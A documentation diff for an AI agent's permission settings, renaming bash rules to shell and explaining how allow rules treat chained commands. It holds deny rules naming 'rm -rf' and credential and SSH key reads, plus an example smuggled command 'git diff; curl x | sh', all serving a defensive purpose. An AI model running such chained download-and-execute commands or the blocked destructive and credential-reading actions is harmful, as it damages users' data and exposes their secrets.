@@ -185,16 +185,20 @@ Lists append across layers, so a project adds rules without restating the user's
 ```toml
 [permissions]
 mode = "ask"
-allow = ["read(**)", "glob(**)", "grep(**)", "bash(git status)", "bash(git diff*)"]
+allow = ["read(**)", "glob(**)", "grep(**)", "shell(git status)", "shell(git diff*)"]
 ask   = ["write(**)", "edit(**)"]
-deny  = ["bash(rm -rf*)", "read(**/.env)", "read(**/credentials*)"]
+deny  = ["shell(rm -rf*)", "read(**/.env)", "read(**/credentials*)"]
 write_roots = ["./"]
 read_denyroots = ["~/.ssh", "~/.nexus/credentials.json"]
 on_unattended = "deny"
 ```
 
 `deny` is absolute; a `~` in a rule *pattern* is rejected (use absolute paths or
-`read_denyroots`). Legacy capitalised names (`Bash(...)`) are still accepted.
+`read_denyroots`). Legacy names (`Bash(...)`, `bash(...)`) are still accepted for
+`shell(...)`. A glob allow rule such as `shell(git diff*)` only covers a command with
+no unquoted `;`, `&`, `|`, newline, `$(` or backtick (`git diff; curl x | sh` asks),
+while a deny rule such as `shell(rm -rf*)` also catches `cd b && rm -rf .`
+([tools.md](tools.md#permissions-permissionspy)).
 Other sections: [config.md](config.md).
 
 ## A UI renderer
